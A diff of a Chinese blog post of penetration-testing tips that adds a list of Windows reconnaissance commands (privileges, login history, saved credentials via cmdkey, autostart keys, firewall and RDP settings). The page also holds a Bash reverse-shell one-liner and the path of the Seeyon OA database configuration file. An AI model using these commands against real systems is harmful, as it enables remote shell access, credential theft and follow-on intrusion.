@@ -23,15 +23,15 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"tingqiao.github.io","root":"/","images":"/images","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
-<meta name="description" content="渗透测试-tip反弹shellLinuxBash1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;8080 0&gt;&amp;1  致远oa数据库配置文件1D:&#x2F;Seeyon&#x2F;A8&#x2F;cfgHome&#x2F;conf.properties">
+<meta name="description" content="渗透测试-tip反弹shellLinuxBash1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;8080 0&gt;&amp;1  windows常用命令查看当前用户权限 1whoami &#x2F;user &#x2F;priv  查看当前系统最近用户登录记录 1query user  查看当前用户最近的”运行”命令历史 1reg query HKEY_CURRENT_USER\So">
 <meta property="og:type" content="article">
-<meta property="og:title" content="tip">
+<meta property="og:title" content="渗透测试-tip">
 <meta property="og:url" content="https://tingqiao.github.io/posts/4883b84c/index.html">
 <meta property="og:site_name" content="TingQiao&#39;s blog">
-<meta property="og:description" content="渗透测试-tip反弹shellLinuxBash1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;8080 0&gt;&amp;1  致远oa数据库配置文件1D:&#x2F;Seeyon&#x2F;A8&#x2F;cfgHome&#x2F;conf.properties">
+<meta property="og:description" content="渗透测试-tip反弹shellLinuxBash1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;8080 0&gt;&amp;1  windows常用命令查看当前用户权限 1whoami &#x2F;user &#x2F;priv  查看当前系统最近用户登录记录 1query user  查看当前用户最近的”运行”命令历史 1reg query HKEY_CURRENT_USER\So">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-12-01T05:53:28.000Z">
-<meta property="article:modified_time" content="2020-12-23T11:00:23.094Z">
+<meta property="article:modified_time" content="2020-12-29T15:41:49.262Z">
 <meta property="article:author" content="听桥">
 <meta property="article:tag" content="tip">
 <meta name="twitter:card" content="summary">
@@ -49,7 +49,7 @@
     lang   : 'zh-CN'
   };
 </script>
-<title>tip | TingQiao's blog</title>
+<title>渗透测试-tip | TingQiao's blog</title>
   
 
 
@@ -185,7 +185,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-tip"><span class="nav-number">1.</span> <span class="nav-text">渗透测试-tip</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.1.</span> <span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux"><span class="nav-number">1.1.1.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Bash"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">Bash</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%B4%E8%BF%9Coa"><span class="nav-number">1.2.</span> <span class="nav-text">致远oa</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.1.</span> <span class="nav-text">数据库配置文件</span></a></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-tip"><span class="nav-number">1.</span> <span class="nav-text">渗透测试-tip</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.1.</span> <span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux"><span class="nav-number">1.1.1.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Bash"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">Bash</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">1.2.</span> <span class="nav-text">windows常用命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%B4%E8%BF%9Coa"><span class="nav-number">1.3.</span> <span class="nav-text">致远oa</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-number">1.3.1.</span> <span class="nav-text">数据库配置文件</span></a></li></ol></li></ol></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -266,7 +266,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          tip
+          渗透测试-tip
         </h1>
 
         <div class="post-meta-container">
@@ -284,7 +284,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-12-23 19:00:23" itemprop="dateModified" datetime="2020-12-23T19:00:23+08:00">2020-12-23</time>
+        <time title="修改时间：2020-12-29 23:41:49" itemprop="dateModified" datetime="2020-12-29T23:41:49+08:00">2020-12-29</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -314,6 +314,93 @@
     
     <div class="post-body" itemprop="articleBody">
         <h2 id="渗透测试-tip"><a href="#渗透测试-tip" class="headerlink" title="渗透测试-tip"></a>渗透测试-tip</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="windows常用命令"><a href="#windows常用命令" class="headerlink" title="windows常用命令"></a>windows常用命令</h3><p>查看当前用户权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user /priv</span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统最近用户登录记录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure>
+
+<p>查看当前用户最近的”运行”命令历史</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</span><br></pre></td></tr></table></figure>
+
+<p>查看 users 目录下的用户记录和当前系统的已安装软件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir c:\users &amp;&amp; dir <span class="string">&quot;c:\Program Files&quot;</span> &amp;&amp; dir <span class="string">&quot;c:\Program Files (x86)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看当前用户的自启动目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c dir <span class="string">&quot;C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span> </span><br></pre></td></tr></table></figure>
+
+<p>查看当前用户的桌面文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c dir <span class="string">&quot;c:\users\%username%\desktop&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看当前用户的数据目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c dir <span class="string">&quot;%appdata%&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看当前用户 Windows 凭据管理器中保存的所有连接记录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /l</span><br></pre></td></tr></table></figure>
+
+<p>查看系统版本位数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic OS get Caption,CSDVersion,OSArchitecture,Version | more</span><br></pre></td></tr></table></figure>
+
+<p>查看系统版本位数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr <span class="string">&quot;OS / x64 x86&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统详细网络配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统的 arp 缓存记录, dns 缓存记录 和 所处域及登录到的 dc 机器名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a &amp;&amp; ipconfig /displaydns &amp;&amp; <span class="built_in">echo</span> %userdomain%,%date%,%time%,%computername%,%username%,%logonserver%</span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统的路由配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route <span class="built_in">print</span> </span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统所有处于连接和监听状态的端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr /i <span class="string">&quot;LISTENING ESTABLISHED&quot;</span> </span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统的所有进程列表包括进程属主信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist &amp;&amp; tasklist /V /FO CSV </span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统的所有本地用户列表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user </span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统的本地管理组用户列表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators </span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统所有已启动的服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start </span><br></pre></td></tr></table></figure>
+
+<p>查看当前用户已建立的 IPC 连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use </span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统的所有共享</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share </span><br></pre></td></tr></table></figure>
+
+<p>查看注册表自启动项</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统的防火墙状态</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show allprofiles</span><br></pre></td></tr></table></figure>
+
+<p>查看当前 Rdp 的连接端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v <span class="string">&quot;PortNumber&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看当前用户的代理 ip 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span> /v <span class="string">&quot;ProxyServer&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统的所有磁盘空间大小剩余</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic logicaldisk get caption,description,drivetype,FileSystem,FreeSpace,Size | more</span><br></pre></td></tr></table></figure>
+
+<p>查看当前用户的屏保设置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic desktop get Name,ScreenSaverActive,ScreenSaverSecure,ScreenSaverTimeout,Wallpaper | more</span><br></pre></td></tr></table></figure>
+
+<p>查看当前用户的环境变量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统所有已安装软件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version | more</span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统所有已安装补丁</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Description,HotFixID,InstalledOn | more</span><br></pre></td></tr></table></figure>
 
 <h3 id="致远oa"><a href="#致远oa" class="headerlink" title="致远oa"></a>致远oa</h3><h4 id="数据库配置文件"><a href="#数据库配置文件" class="headerlink" title="数据库配置文件"></a>数据库配置文件</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:/<span class="title">Seeyon</span>/<span class="title">A8</span>/<span class="title">cfgHome</span>/<span class="title">conf.properties</span></span></span><br></pre></td></tr></table></figure>
 
